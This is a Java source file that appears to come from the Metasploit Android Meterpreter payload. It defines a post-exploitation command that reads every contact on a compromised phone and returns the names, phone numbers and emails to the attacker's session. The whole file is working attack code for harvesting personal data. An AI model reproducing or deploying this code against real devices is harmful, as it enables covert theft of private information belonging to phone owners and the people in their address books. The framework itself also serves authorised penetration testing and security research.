package com.metasploit.meterpreter.android;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;

import android.provider.ContactsContract;
import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class android_dump_contacts implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_CONTACT_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9007);
    private static final int TLV_TYPE_CONTACT_NUMBER = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9008);
    private static final int TLV_TYPE_CONTACT_EMAIL = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9009);
    private static final int TLV_TYPE_CONTACT_NAME = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9010);

    private static final String _id = "_id";
    private static final String displayName = "display_name";
    private static final String contactId = "contact_id";
    private static final String data1 = "data1";

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        ContentResolver cr = AndroidMeterpreter.getContext()
                .getContentResolver();

        if (Integer.parseInt(Build.VERSION.RELEASE.split("\\.")[0]) >= 2) {
            Uri ContactUri = ContactsContract.Contacts.CONTENT_URI;
            Uri PhoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            Uri EmailUri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
            Cursor cur = cr.query(ContactUri, null, null, null, null);

            while (cur.moveToNext()) {
                TLVPacket pckt = new TLVPacket();
                String id = cur.getString(cur.getColumnIndex(_id));

                // Name
                pckt.addOverflow(TLV_TYPE_CONTACT_NAME, cur.getString(cur.getColumnIndex(displayName)));

                // Number
                Cursor pCur = cr.query(PhoneUri, null, contactId + " = ?",
                        new String[]{id}, null);
                while (pCur.moveToNext()) {
                    pckt.addOverflow(TLV_TYPE_CONTACT_NUMBER,
                            pCur.getString(pCur.getColumnIndex(data1)));
                }
                pCur.close();

                // Email
                Cursor emailCur = cr.query(EmailUri, null, contactId
                        + " = ?", new String[]{id}, null);
                while (emailCur.moveToNext()) {
                    pckt.addOverflow(TLV_TYPE_CONTACT_EMAIL, emailCur
                            .getString(emailCur.getColumnIndex(data1)));
                }
                emailCur.close();

                response.addOverflow(TLV_TYPE_CONTACT_GROUP, pckt);
            }

            cur.close();
        }

        return ERROR_SUCCESS;
    }

}
